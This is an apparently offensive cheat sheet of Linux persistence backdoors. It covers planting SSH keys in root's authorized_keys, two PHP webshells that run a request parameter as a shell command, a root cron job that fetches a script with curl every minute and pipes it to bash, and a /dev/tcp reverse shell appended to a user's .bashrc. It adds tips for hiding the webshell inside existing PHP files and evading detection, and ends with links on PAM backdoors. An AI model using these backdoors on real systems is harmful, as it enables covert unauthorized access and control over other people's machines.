#Linux 
## SSH backdoor
The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.

`ssh-keygen`

Now that we have 2 keys. 1 private key and 1 public key, we can now go to /root/.ssh and leave our public key there. Don't forget to rename the public key to : authorized_keys

>Give the private key the right permissions: `chmod 600 id_rsa`
>Log in to the machine: `ssh -i id_rsa root@ip`

## PHP backdoor
If you get root access on a Linux host, you will most likely search for creds and or any useful information in the web root.

The web root is usually located in : /var/www/html

What you have to know is that, whatever you leave in /var/www/html, will be available for everybody to use in their browser.

Simple php webshell that executes the command passed in the GET or POST cmd parameter 
```php
<?php  
if(isset($_REQUEST['cmd'])){  
        echo "<pre>";  
        $cmd = ($_REQUEST['cmd']);  
        system($cmd);  
        echo "</pre>";  
        die;  
}  
?>
```
Another way to achieve the same thing
```php
<?php  
    if (isset($_REQUEST['cmd'])) {  
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
    }  
?>
```

>Tips
>1. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.
>2. Change the "cmd" parameter to something else... anything actually... just change it to something that isn't that common. "Cmd" is really common and is already really well known in the hacking community.

## CronJob backdoor
Once you got root access on any host, you can add any scheduled task in /etc/crontab. You could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we're going to do.

Add this line into our cronjob file :

`* *     * * *   root    curl http://<yourip>:8080/shell | bash`  

Notice that we put a `*` star symbol to everything. This means that our task will run every minute, every hour, every day , etc .

We first use "curl" to download a file , and then we pipe it to "bash"

The contents of the "shell" file that we are using are simply :

```shell
#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1
```

We would have to run an HTTP server serving our shell.

You can achieve this by running : "python3 -m http.server 8080"  

Once our shell gets downloaded, it will be executed by "bash" and we would get a shell!

*Don't forget to listen on your specified port with "nc -nvlp port"*

## .bashrc backdoor
If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.

So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their ".bashrc".

`echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc`

## pam_unix.so backdoor
https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
https://github.com/zephrax/linux-pam-backdoor
https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c